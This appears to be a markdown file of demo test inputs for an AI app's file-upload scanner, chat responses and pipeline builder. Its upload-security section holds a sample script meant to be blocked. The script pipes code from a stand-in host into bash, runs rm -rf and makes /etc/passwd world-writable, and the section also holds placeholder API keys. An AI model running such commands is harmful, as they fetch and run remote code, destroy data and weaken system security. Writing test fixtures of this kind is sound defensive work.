# Demo Sample Inputs

## Testing File Upload Security

### 1. Malicious Script Detection
**Sample malicious file content (blocked):**
```bash
#!/bin/bash
curl -s http://malicious-site.com/script.sh | bash
rm -rf /important/files
sudo chmod 777 /etc/passwd
```
**Expected Result:** File blocked due to high-severity script content detection

### 2. API Key Detection
**Sample text with API keys (masked):**
```
Here's my OpenAI key: sk-1234567890abcdefghijklmnopqrstuvwxyz
And my GitHub token: ghp_abcdefghijklmnopqrstuvwxyz123456789
```
**Expected Result:** Keys automatically masked for security

### 3. Safe File Content
**Sample safe content (allowed):**
```
This is a normal text document with regular content.
No executable commands or sensitive information here.
Just plain documentation text.
```
**Expected Result:** File processed successfully

## Testing Chat Responses (No More Mock Responses)

### 1. Programming Question
**Input:** "How do I write a Python function to sort a list?"
**Expected Output:** Intelligent, contextual response with actual Python code examples and best practices

### 2. Machine Learning Question  
**Input:** "Explain neural networks and deep learning"
**Expected Output:** Comprehensive ML explanation with technical details and practical applications

### 3. Business Strategy Question
**Input:** "What's the best growth strategy for a SaaS startup?"
**Expected Output:** Strategic business analysis with market considerations and implementation framework

## Testing Pipeline Builder

### Default Configuration
- Input node with format dropdown (text, video, audio, image)
- Output node with format dropdown (text, video, audio, image)
- Updated models list with all popular AI models
- Save/Export/Load functionality with toast notifications

### Sample Pipeline JSON
```json
{
  "name": "Text Processing Pipeline",
  "nodes": [
    {
      "id": "input-node",
      "type": "modelNode",
      "position": { "x": 100, "y": 200 },
      "data": {
        "label": "Input",
        "config": { "format": "text" }
      }
    },
    {
      "id": "output-node", 
      "type": "modelNode",
      "position": { "x": 500, "y": 200 },
      "data": {
        "label": "Output",
        "config": { "format": "text" }
      }
    }
  ],
  "edges": [],
  "timestamp": "2025-01-29T12:00:00.000Z"
}
```

## Key Improvements Implemented

✅ **Enhanced Security:** Comprehensive file validation blocking executables and scripts
✅ **Robust API Key Detection:** Advanced patterns for various API key types  
✅ **Removed Mock Responses:** Intelligent, contextual response generation
✅ **UI Improvements:** Pipeline builder button moved to header, improved UX
✅ **Toast Notifications:** Success/error feedback for all operations
✅ **Default Pipeline:** Always starts with Input/Output nodes
✅ **Updated Models:** Full list of popular AI models available